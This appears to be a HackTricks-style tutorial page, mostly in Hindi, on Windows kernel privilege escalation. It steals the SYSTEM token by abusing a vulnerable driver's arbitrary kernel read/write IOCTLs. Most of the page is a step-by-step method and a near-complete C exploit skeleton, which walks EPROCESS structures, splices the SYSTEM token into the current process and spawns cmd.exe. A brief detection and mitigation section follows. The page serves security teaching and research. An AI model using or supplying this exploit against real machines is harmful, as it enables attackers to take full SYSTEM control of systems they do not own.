# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

यदि कोई vulnerable driver ऐसा IOCTL एक्सपोज़ करता है जो हमलावर को arbitrary kernel read और/या write primitives देता है, तो NT AUTHORITY\SYSTEM पर उन्नयन अक्सर SYSTEM access token चुरा कर हासिल किया जा सकता है। यह तकनीक SYSTEM process के EPROCESS से Token pointer को वर्तमान process के EPROCESS में कॉपी करती है।

क्यों यह काम करता है:
- प्रत्येक process का एक EPROCESS संरचना होती है जिसमें (अन्य फील्ड्स के साथ) एक Token होता है (वास्तव में token object के लिए एक EX_FAST_REF)।
- SYSTEM process (PID 4) के पास सभी privileges सक्षम किए हुए एक token होता है।
- वर्तमान process का EPROCESS.Token को SYSTEM token pointer से बदलने पर वर्तमान process तुरंत SYSTEM के रूप में चलने लगता है।

> EPROCESS में offsets Windows के संस्करणों के अनुसार बदलते रहते हैं। इन्हें डायनामिकली (symbols) से निर्धारित करें या version-specific constants का उपयोग करें। साथ ही याद रखें कि EPROCESS.Token एक EX_FAST_REF है (निचले 3 बिट्स reference count flags हैं)।

## उच्च-स्तरीय चरण

1) ntoskrnl.exe base ढूंढें और PsInitialSystemProcess का पता हल करें।
- user mode से, loaded driver bases पाने के लिए NtQuerySystemInformation(SystemModuleInformation) या EnumDeviceDrivers का उपयोग करें।
- kernel base में PsInitialSystemProcess का offset (symbols/reversing से) जोड़कर उसका address प्राप्त करें।
2) PsInitialSystemProcess पर pointer पढ़ें → यह SYSTEM के EPROCESS का kernel pointer है।
3) SYSTEM EPROCESS से UniqueProcessId और ActiveProcessLinks के offsets पढ़ें ताकि EPROCESS संरचनाओं की doubly linked list (ActiveProcessLinks.Flink/Blink) को traverse किया जा सके, जब तक कि आप उस EPROCESS को न पाएं जिसकी UniqueProcessId GetCurrentProcessId() के बराबर हो। दोनों को रखें:
- EPROCESS_SYSTEM (SYSTEM के लिए)
- EPROCESS_SELF (वर्तमान process के लिए)
4) SYSTEM token value पढ़ें: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset)।
- निचले 3 बिट्स को mask करें: Token_SYS_masked = Token_SYS & ~0xF (आम तौर पर ~0xF या ~0x7 बिल्ड पर निर्भर करता है; x64 पर निचले 3 बिट्स का उपयोग होता है — 0xFFFFFFFFFFFFFFF8 mask)।
5) विकल्प A (सामान्य): अपनी current token के निचले 3 बिट्स को संरक्षित रखें और embedded ref count को consistent रखने के लिए उन्हें SYSTEM के pointer पर splice करें।
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) अपने kernel write primitive का उपयोग करके Token_NEW को (EPROCESS_SELF + TokenOffset) में वापस लिखें।
7) आपका वर्तमान process अब SYSTEM है। पुष्टि के लिए वैकल्पिक रूप से नया cmd.exe या powershell.exe spawn करें।

## छद्मकोड

नीचे एक skeleton है जो केवल एक vulnerable driver से दो IOCTLs का उपयोग करता है, एक 8-byte kernel read के लिए और एक 8-byte kernel write के लिए। इसे अपने driver के interface से बदलें।
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
नोट्स:
- ऑफ़सेट: WinDbg’s `dt nt!_EPROCESS` को लक्ष्य के PDBs के साथ, या एक runtime symbol loader का उपयोग करके, सही offsets प्राप्त करें। अंधाधुंध हार्डकोड न करें।
- मास्क: x64 पर token एक EX_FAST_REF है; निचले 3 बिट रेफरेंस काउंट बिट्स होते हैं। अपने token के मूल निचले बिट्स बनाए रखने से तुरंत refcount असंगतियों से बचता है।
- स्थिरता: वर्तमान प्रोसेस को बढ़ाना प्राथमिकता दें; यदि आप किसी short-lived helper को elevate करते हैं तो वह समाप्त होते ही SYSTEM खो सकते हैं।

## डिटेक्शन और निवारण
- शक्तिशाली IOCTLs उजागर करने वाले unsigned या अविश्वसनीय third‑party drivers को लोड करना मूल कारण है।
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard, और Attack Surface Reduction नियम कमजोर ड्राइवर्स को लोड होने से रोक सकते हैं।
- EDR संदिग्ध IOCTL sequences जो arbitrary read/write को लागू करते हैं और token swaps के लिए निगरानी कर सकता है।

## संदर्भ
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
